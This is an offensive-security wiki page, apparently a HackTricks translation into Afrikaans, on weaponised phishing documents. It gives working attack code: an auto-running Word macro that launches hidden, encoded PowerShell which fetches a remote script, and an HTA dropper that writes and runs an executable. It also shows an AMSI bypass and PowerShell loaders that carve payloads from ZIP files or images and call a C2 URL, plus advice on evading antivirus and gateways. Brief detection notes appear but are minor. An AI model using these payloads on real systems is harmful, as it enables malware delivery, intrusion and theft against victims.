# Phishing Lêers & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office Dokumente

Microsoft Word voer lêerdata-validering uit voordat 'n lêer oopgemaak word. Data-validering word uitgevoer in die vorm van identifikasie van datastrukture, volgens die OfficeOpenXML-standaard. As enige fout tydens die identifikasie van die datastruktuur voorkom, sal die lêer wat geanaliseer word nie oopgemaak word nie.

Gewoonlik gebruik Word-lêers wat macros bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul macro-uitvoeringsvermoëns te behou.\
Byvoorbeeld, 'n RTF-lêer ondersteun macros nie, volgens ontwerp, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en sal in staat wees tot macro-uitvoering.\
Dieselfde interne strukture en meganismes geld vir alle sagteware van die Microsoft Office Suite (Excel, PowerPoint etc.).

Jy kan die volgende opdrag gebruik om te kontroleer watter lêeruitbreidings deur sommige Office-programme uitgevoer gaan word:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-lêers wat na 'n afgeleë sjabloon verwys (File –Options –Add-ins –Manage: Templates –Go) wat macros bevat, kan ook macros uitvoer.

### Eksterne Beeldlading

Go to: _Insert --> Quick Parts --> Field_\
_**Kategorieë**: Links and References, **Veldname**: includePicture, en **Lêernaam of URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Dit is moontlik om macros te gebruik om arbitrary code van die dokument af uit te voer.

#### Autoload functions

Hoe meer algemeen hulle is, hoe groter is die waarskynlikheid dat die AV hulle sal opspoor.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Verwyder metadata handmatig

Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Dokumentinspekteerder oopmaak. Klik **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.

#### Doc-uitbreiding

Wanneer klaar, kies die **Stoor as tipe**-dropdown, verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\  
Doen dit omdat jy **nie macro's binne 'n `.docx` kan stoor nie** en daar 'n **stigma** **rondom** die macro-enabled **`.docm`** uitbreiding is (bv. die miniatuurikoon het 'n groot `!` en sommige web/email gateways blokkeer dit heeltemal). Daarom is hierdie **erfenis `.doc` uitbreiding die beste kompromis**.

#### Kwaadaardige Macros-generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Lêers

'n HTA is 'n Windows-program wat **HTML en skriptaaltale (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en voer uit as 'n "volledig vertroude" toepassing, sonder die beperkinge van 'n blaaier se sekuriteitsmodel.

'n HTA word uitgevoer met **`mshta.exe`**, wat gewoonlik saam met **Internet Explorer** geïnstalleer is, wat beteken dat **`mshta` afhanklik van IE is**. As dit verwyder is, sal HTAs nie uitgevoer kan word nie.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM-verifikasie afdwing

Daar is verskeie maniere om **NTLM authentication "remotely"** af te dwing, byvoorbeeld, jy kan **onsigbare beelde** by e-posse of HTML voeg wat die gebruiker sal besoek (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat **'n authentication** sal **aktiveer** net deur **die gids oop te maak.**

**Kyk na hierdie idees en meer in die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moet nie vergeet dat jy nie net die hash of die authentication kan steel nie, maar ook **NTLM relay attacks** kan uitvoer:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Baie effektiewe veldtogte lewer 'n ZIP wat twee wettige lok-dokumente (PDF/DOCX) en 'n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell loader binne die ZIP se rou bytes na 'n unieke marker gestoor word, en die .lnk dit uitsny en volledig in die geheue uitvoer.

Tipiese vloei geïmplementeer deur die .lnk PowerShell one-liner:

1) Vind die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, en die ouer van die huidige werkdirektorie.  
2) Lees die ZIP-bytes en vind 'n hardgekodeerde marker (bv. xFIQCV). Alles na die marker is die ingeslote PowerShell payload.  
3) Kopieer die ZIP na %ProgramData%, pak dit daar uit, en open die lok .docx om legitiem te lyk.  
4) Om AMSI te omseil vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Deobfuscate die volgende fase (bv. verwyder alle # karakters) en voer dit in die geheue uit.

Voorbeeld PowerShell-skelet om die ingeslote fase uit te kerf en uit te voer:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Aantekeninge
- Versending maak dikwels misbruik van bekende PaaS-subdomeine (bv., *.herokuapp.com) en kan die payloads afskerm (dien goedaardige ZIPs op grond van IP/UA).
- Die volgende fase ontcijfer dikwels base64/XOR shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om skyfartefakte te minimaliseer.

Persistensie wat in dieselfde ketting gebruik word
- COM TypeLib hijacking of the Microsoft Web Browser control sodat IE/Explorer of enige app wat dit inkorporeer die payload outomaties herbegin. Sien besonderhede en kant-en-klare opdragte hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Opsporing/IOCs
- ZIP-lêers wat die ASCII-merkerstring (bv., xFIQCV) bevat wat aan die argiefdata aangeheg is.
- .lnk wat ouer- en gebruikersgidse deurloop om die ZIP te lok en 'n lokdokument oopmaak.
- AMSI-manipulasie via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langdurige besigheidsdrade wat eindig met skakels aangebied onder vertroude PaaS-domeine.

## Steganography-afgebakende payloads in beelde (PowerShell stager)

Onlangse loader chains lewer 'n geobfuskede JavaScript/VBS wat 'n Base64 PowerShell stager dekodeer en uitvoer. Daardie stager laai 'n beeld af (dikwels GIF) wat 'n Base64-gekodeerde .NET DLL bevat, weggesteek as platte teks tussen unieke begin-/eindmerkers. Die skrip soek na hierdie merkers (voorbeelde in die veld: «<<sudo_png>> … <<sudo_odt>>>»), onttrek die tussenliggende teks, dekodeer dit van Base64 na bytes, laai die assembly in-memory en roep 'n bekende entry-metode aan met die C2 URL.

Werkvloeistroom
- Stage 1: Gearchiveerde JS/VBS dropper → ontkodeer ingebedde Base64 → lanseer PowerShell stager met -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → laai beeld af, ekstraheer marker-afgebakende Base64, laai die .NET DLL in-memory en roep sy metode (bv., VAI) aan en gee die C2 URL en opsies as argumente.
- Stage 3: Die loader haal die finale payload op en injekteer dit tipies via process hollowing in 'n vertroude binêre (gewoonlik MSBuild.exe). Sien meer oor process hollowing en trusted utility proxy execution hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-voorbeeld om 'n DLL uit 'n beeld te ekstraheer en 'n .NET-metode in-memory aan te roep:

<details>
<summary>PowerShell stego payload-uittrekselaar en laaier</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Aantekeninge
- Dit is ATT&CK T1027.003 (steganography/marker-hiding). Markers verskil tussen veldtogte.
- AMSI/ETW bypass en string deobfuscation word gewoonlik toegepas voordat die assembly gelaai word.
- Hunting: skandeer afgelaaide images vir bekende delimiters; identifiseer PowerShell wat images benader en onmiddellik Base64 blobs dekodeer.

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Basiese logika (abstrak):
- Lees eie lêerinhoud
- Vind 'n Base64-blok tussen rommelstrings
- Dekodeer na ASCII PowerShell
- Voer uit met `wscript.exe`/`cscript.exe` wat `powershell.exe` oproep

Hunting cues
- Gearchiveerde JS/VBS-aanhangsels wat `powershell.exe` spawn met `-enc`/`FromBase64String` in die opdragreël.
- `wscript.exe` wat `powershell.exe -nop -w hidden` vanaf gebruiker se temp-paaie lanseer.

## Windows-lêers om NTLM-hashes te steel

Kyk na die bladsy oor **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
